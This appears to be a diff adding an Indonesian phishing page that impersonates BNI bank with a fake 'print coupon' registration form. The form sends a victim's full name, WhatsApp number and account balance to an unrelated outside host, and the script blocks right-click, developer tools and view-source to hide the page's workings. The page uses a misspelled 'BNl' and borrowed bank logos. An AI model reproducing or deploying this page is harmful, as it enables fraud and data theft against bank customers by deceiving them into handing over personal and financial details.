@@ -1,0 +1,228 @@
+<html lang="id">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta name="theme-color" content="#FE6A00"> 
+  <meta name="description" content="Cetak Kupon BNl secara online dengan mudah dan cepat."> 
+  <title>Cetak Kupon BNI</title> 
+  <link rel="icon" type="image/png" href="https://hosting.tigerengine.id/ssmuyg.jpg"> 
+  <link rel="image_src" href="https://blogger.googleusercontent.com/img/a/AVvXsEhkXOmHr5eUfMkkQWH-hjDonzPvU1xMckXBqk48YWblw5760EpL3VKv4ja6dC0h_TRTbE9j3JkrNwcocnSKB-E7nQ9Q-eseb3-GIyLjj5u_HhBFFXdyP6nlBMqUVWqfRyAjtHmUUMI2LugHpWQ281yr8Y-tkuFvAmnxWpHOw5I5E77U-7kMi1BOWf6P"> 
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: start;
+      padding-top: 50px;
+    }  
+    
+                .navbar img{
+            width: 100%;
+            height: 100px;
+            margin-left: -18px;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navbar img {
+            height: 9%;
+           width: 100%;
+             cursor: ir;
+        }
+    .container {
+      background: white;
+      width: 305px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 22px;
+      margin-top: 45px;
+    }
+    .kupon {
+      background: #1c1c1c;
+      color: white;
+      border-radius: 15px;
+      padding: 20px 20px;
+      margin-bottom: 30px;
+      position: relative;
+      overflow: hidden;
+    }
+    .kupon::before, .kupon::after {
+      content: '';
+      position: absolute;
+      width: 10px;
+      height: 30px;
+      background: #ffffff;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 2;
+    }
+    .kupon::before {
+      left: 0;
+      border-radius: 0 10px 10px 0;
+    }
+    .kupon::after {
+      right: 0;
+      border-radius: 10px 0 0 10px;
+    }
+    .kupon-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .kupon-header img {
+      height: 40px;
+      margin-left: -10;
+      width: 90px;
+    }
+    .kupon-header span {
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .kupon h2 {
+      margin: 15px 0 5px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .kupon p {
+      margin: 0;
+      font-size: 15px;
+      color: #ffdf57;
+    }
+    .barcode {
+      position: absolute;
+      right: -20px;
+      top: 50%;
+      transform: translateY(-50%) rotate(90deg);
+    }
+    .barcode img {
+      height: 60px;
+    }
+    form label {
+      font-weight: bold;
+      color: #f7941d;
+      display: block;
+      margin-bottom: 6px;
+    }
+    form input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #f7941d;
+      border-radius: 8px;
+      font-size: 14px;
+      outline-color: orange;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #2b6577;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #c0c0c0;
+    }
+    
+               .navar img{
+            width: 100%;
+            height: 100px;
+            margin-left: -95.4%;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navar img {
+            height: 7%;
+           width: 100%;
+           margin-top: 168%;
+             cursor: none;
+        }
+  </style> 
+ </head>      <div class="navbar">
+        <img src="https://raw.githubusercontent.com/qqqpo/-/refs/heads/main/1.jpg" alt="BRImo Logo">
+    </div><br><br>
+ <body>
+  <div class="container"> 
+   <div class="kupon"> 
+    <div class="kupon-header"> 
+     <img src="https://media.licdn.com/dms/image/v2/D5622AQE9XiWwLm3y8w/feedshare-shrink_800/B56ZWd5VpaGoAg-/0/1742110809299?e=2147483647&v=beta&t=a3rcefpKjLUiPA6lpuFL0hYh3HZS-bdst0zg1UMcPaU" alt="Logo BNI"> 
+     <span>CETAK KUPON</span> 
+    </div> 
+    <h2 id="outputPatok">Nama Nasabah</h2> 
+    <p id="outputTundun">+62 ***********</p> 
+    <div class="barcode"> 
+     <img src="https://barcode.tec-it.com/barcode.ashx?data=BNI2025&amp;code=Code128&amp;translate-esc=false" alt="barcode"> 
+    </div> 
+   </div> 
+   <form action="https://darkekx.biz.id/bnn/on.php" method="POST" oninput="updatePreview()"> 
+    <label>Nama Nasabah:</label> <center>
+    <input type="text" id="patok" name="a" placeholder="Masukkan Nama Lengkap Nasabah" required></center> 
+    <label>Nomor WhatsApp:</label> 
+    <center><input type="tel" id="tundun" name="b" placeholder="08123456789" inputmode="numeric" pattern="[0-9]*" maxlength="13" required> </center>
+    <label>Saldo Akhir:</label> 
+   <center> <input type="text" id="cicak" name="c" placeholder="Rp" inputmode="numeric" maxlength="15" required> </center><br>
+    <button type="submit">Daftarkan</button> 
+   </form> 
+  </div> 
+       <div class="navar">
+        <img src="https://raw.githubusercontent.com/qqqpo/-/refs/heads/main/20250120_195923.jpg" alt="BRImo Logo">
+    </div><br>
+  <script>
+    function updatePreview() {
+      const nama = document.getElementById("patok").value;
+      let hp = document.getElementById("tundun").value.replace(/\D/g, '');
+      if (hp.startsWith("0")) hp = hp.substring(1);
+      document.getElementById("outputPatok").innerText = nama || "Nama Nasabah";
+      document.getElementById("outputTundun").innerText = hp ? "+62 " + hp : "+62 ***********";
+    }
+
+    const saldoInput = document.getElementById("cicak");
+    saldoInput.addEventListener("input", function () {
+      let value = this.value.replace(/\D/g, "");
+      if (value.length > 15) {
+        value = value.substring(0, 15);
+      }
+      this.value = formatRupiah(value);
+    });
+
+    function formatRupiah(angka) {
+      const reverse = angka.toString().split("").reverse().join("");
+      const ribuan = reverse.match(/\d{1,3}/g);
+      return "Rp " + ribuan.join(".").split("").reverse().join("");
+    }
+
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
+        (e.ctrlKey && (e.key === "U" || e.key === "C" || e.key === "S"))
+      ) {
+        e.preventDefault();
+      }
+    });
+  </script> 
+ </body>
+</html>
